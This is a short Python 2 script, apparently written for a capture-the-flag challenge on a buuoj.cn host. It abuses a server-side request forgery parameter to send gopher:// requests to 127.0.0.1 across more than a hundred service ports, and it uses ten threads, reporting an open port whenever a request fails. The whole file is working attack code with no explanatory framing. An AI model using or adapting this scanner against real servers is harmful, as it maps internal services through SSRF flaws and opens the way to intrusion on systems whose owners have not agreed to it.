import requests
import time
import threading
import Queue
lock = threading.Lock()
threads_count = 10
scheme = 'gopher'
ports = [21,22,23,25,69,80,81,82,83,84,110,389,389,443,445,488,512,513,514,873,901,1043,1080,1099,1090,1158,1352,1433,1434,1521,2049,2100,2181,2601,2604,3128,3306,3307,3389,4440,4444,4445,4848,5000,5280,5432,5500,5632,5900,5901,5902,5903,5984,6000,6033,6082,6379,6666,7001,7001,7002,7070,7101,7676,7777,7899,7988,8000,8001,8002,8003,8004,8005,8006,8007,8008,8009,8069,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8098,8099,8980,8990,8443,8686,8787,8880,8888,9000,9001,9043,9045,9060,9080,9081,9088,9088,9090,9091,9100,9200,9300,9443,9871,9999,10000,10068,10086,11211,20000,22022,22222,27017,28017,50060,50070]
ip_block = '127.0.0'

class WyWorker(threading.Thread):
    def __init__(self,queue):
        threading.Thread.__init__(self)
        self.queue = queue
    def run(self):
        while True:
            if self.queue.empty():
                break
            try:
                url = self.queue.get()
                time.sleep(0.3)
                r = requests.get(url,timeout=5)
                
            except:
                lock.acquire()
                ip_port = url.split(':')
                ip = ip_port[-2][2:]
                port = ip_port[-1]
                print "[+]{ip} : {port}  Open".format(ip=ip,port=port)
                lock.release()
# payload queue                
queue = Queue.Queue()
for c in xrange(1,2):
    ip = '{0}.{1}'.format(ip_block,c)
    for port in ports:

        payload = '{scheme}://{ip}:{port}'.format(
            scheme=scheme,
            ip=ip, 
            port=port
            )
        #print payload
        url = "http://fd448fe4-a753-4255-8852-59c7e5b28418.node3.buuoj.cn/?&filename=result{port}&url={payload}".format(port=port,payload=payload)
        queue.put(url)


threads = []
for i in xrange(threads_count):
    threads.append(WyWorker(queue))
for t in threads:
    t.start()
for t in threads:
    t.join()

while queue.qsize()>0:
    time.sleep(1)